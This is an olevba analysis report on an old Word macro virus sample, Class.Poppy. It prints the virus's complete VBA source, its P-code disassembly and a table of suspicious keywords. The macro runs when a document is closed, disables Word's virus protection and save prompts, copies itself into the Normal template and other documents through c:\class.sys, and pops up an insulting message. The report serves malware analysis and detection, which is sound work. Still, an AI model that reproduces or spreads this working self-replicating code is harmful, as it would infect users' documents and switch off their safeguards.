olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.et
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.et - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
On Error GoTo out
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
Options.VirusProtection = False
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
Options.SaveNormalPrompt = False
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
Options.ConfirmConversions = False
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
If nt > 70 And ad > 0 Then GoTo out
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
If nt < 70 Then
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
End If
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
If (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
host.codemodule.AddFromFile ("c:\class.sys")
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
With host.codemodule
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    For x = 1 To 4
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    .deletelines 1
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    Next x
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
End With
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
If nt < 80 Then
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    With host.codemodule
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    .replaceline 1, "Sub AutoClose()"
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    .replaceline 71, "Sub ToolsMacro()"
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    End With
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
End If
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
With host.codemodule
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    For x = 2 To 72 Step 2
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
    Next x
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
End With
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
out:
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
End Sub
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
Sub ToolsMacro()
'Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.et
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6821 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #2:
' 	OnError out 
' Line #3:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #11:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #13:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #14:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #15:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #16:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #17:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #19:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #20:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #21:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #22:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #26:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #28:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0021 "VicodinES Loves You / Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #29:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #30:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #31:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #32:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #33:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #34:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #35:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #37:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #38:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #40:
' 	EndWith 
' Line #41:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #42:
' 	Ld nt 
' 	LitDI2 0x0050 
' 	Lt 
' 	IfBlock 
' Line #43:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #44:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #45:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #46:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #48:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #49:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #50:
' 	EndWith 
' Line #51:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #54:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #55:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #56:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0048 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #57:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #58:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	Ld Application 
' 	MemLd Assistant 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #59:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #60:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #62:
' 	EndWith 
' Line #63:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #64:
' 	Label out 
' Line #65:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #66:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #67:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #68:
' 	EndSub 
' Line #69:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #70:
' 	FuncDefn (Sub ToolsMacro())
' Line #71:
' 	QuoteRem 0x0000 0x0044 "Ditry PC10/11/00 11:02:50 AMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

